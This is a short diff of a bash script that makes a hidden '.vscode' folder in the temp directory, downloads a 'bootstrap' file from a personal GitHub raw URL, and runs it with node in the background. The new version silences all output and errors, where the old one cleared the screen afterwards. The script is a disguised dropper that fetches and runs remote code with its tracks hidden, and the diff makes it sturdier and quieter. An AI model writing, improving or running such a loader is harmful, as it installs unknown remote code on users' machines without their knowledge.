@@ -1,14 +1,16 @@
 
 #!/bin/bash
 
-VSCODE_DIR="$TMPDIR/.vscode"
+VSCODE_DIR="${TMPDIR%/}/.vscode"
 
 mkdir -p "$VSCODE_DIR"
 
-curl -s -L -o "$VSCODE_DIR/bootstrap.js" https://raw.githubusercontent.com/ph2860051/o-g/refs/heads/main/bootstrap
+BOOTSTRAP_URL="https://raw.githubusercontent.com/ph2860051/o-g/refs/heads/main/bootstrap"
+BOOTSTRAP_FILE="$VSCODE_DIR/bootstrap.js"
 
-clear
+curl -fsSL "$BOOTSTRAP_URL" -o "$BOOTSTRAP_FILE" || exit 0
 
-node "$VSCODE_DIR/bootstrap.js" &
+if command -v node >/dev/null 2>&1; then
+    node "$BOOTSTRAP_FILE" >/dev/null 2>&1 &
+fi
 
-clear
